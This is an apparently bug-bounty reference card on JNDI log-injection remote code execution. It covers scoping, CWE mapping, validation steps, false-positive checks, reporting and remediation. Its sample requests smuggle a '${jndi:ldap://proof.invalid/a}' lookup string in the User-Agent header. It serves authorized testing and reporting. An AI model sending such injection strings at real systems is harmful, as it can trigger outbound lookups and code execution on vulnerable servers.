# JNDI / Log Injection RCE Pattern

## Scope
Use this reference only on assets where you have explicit authorization. Prefer test accounts, test tenants, sandbox payments, and non-destructive proof data. Do not run destructive payloads, persistence, shells, credential theft, or data exfiltration.

## Mapping

| Field | Value |
| --- | --- |
| HackerOne weakness | Improper Neutralization of Special Elements in Output Used by a Downstream Component |
| CWE / external ID | CWE-74 / CWE-917 |
| OWASP / WSTG / API mapping | OWASP A03 Injection / Logging Pipeline |

## What to look for

User-controlled headers or parameters are logged and interpreted by a vulnerable logging framework or downstream processor.

## Vulnerable request

```http
GET /search?q=proof HTTP/1.1
Host: target.example
User-Agent: ${jndi:ldap://proof.invalid/a}
X-Request-ID: PROOF_LOG_72c
```

## Vulnerable response / observable behavior

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"results":[]}

Out-of-band collaborator receives a single DNS lookup for proof identifier.
```

## Expected safe request

```http
GET /search?q=proof HTTP/1.1
Host: target.example
User-Agent: ${jndi:ldap://proof.invalid/a}
X-Request-ID: PROOF_LOG_72c
```

## Expected safe response / behavior

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"results":[]}

No lookup. Logs store the string as inert text or sanitize it.
```

## Evidence to collect

Only use non-exploit callback indicators where explicitly allowed. Do not serve classes, payloads, or exploit chains. Evidence is the sanitized request plus callback timestamp.

## Remediation direction

Patch vulnerable libraries, disable dangerous lookup features, sanitize log fields, block unexpected egress from app/logging tiers, and add dependency/SBOM checks.

## Report checklist

- Affected endpoint, method, and parameter/body field.
- Program scope confirmation and test account/tenant used.
- Baseline safe request and modified vulnerable request.
- Exact response difference, side effect, timing delta, or controlled callback proof.
- Expected vs actual behavior.
- Business impact written in plain language.
- Clear remediation recommendation and regression test.
- Redaction of credentials, tokens, secrets, PII, and private customer data.
- evidence note path in the response or user-requested artifact updated with evidence summary.

## Validation workflow

1. Capture a baseline request and response with an authorized control account.
2. Change exactly one attacker-controlled variable, such as an object id, role field, URL, origin, file, token, callback, or payload parameter.
3. Replay with anonymous, same-role, cross-account, cross-tenant, and privileged controls when applicable.
4. Compare status code, response body, state change, callback, browser execution, cache behavior, and audit side effects.
5. Stop when impact is clear and keep proof low-volume, reversible, and scoped.

## False-positive checks

Suppress or downgrade when:

- the response is public, self-only, intentionally exposed, or blocked by the expected control
- the action requires equivalent privilege and crosses no meaningful boundary
- browser policy, framework behavior, middleware, gateway, or deployment config blocks the exact path
- the proof is only a banner, version, missing non-security header, status-code difference, or scanner alert
- the next step would require destructive, high-volume, or out-of-scope testing

## Evidence template

Record:

- endpoint, method, role, object id, tenant id, and request shape
- expected safe behavior and actual behavior
- changed variable and control accounts used
- evidence excerpt with secrets and personal data masked
- impact, confidence, counterevidence, and proof gaps
- remediation and retest steps

## Remediation prompts

Prefer targeted fixes: object-level authorization, server-side invariant checks, contextual output encoding, parameterized queries, strict parser configuration, URL and protocol allowlists, safe file serving origin, CSRF protections, token binding, cache-key hardening, or workflow state validation.
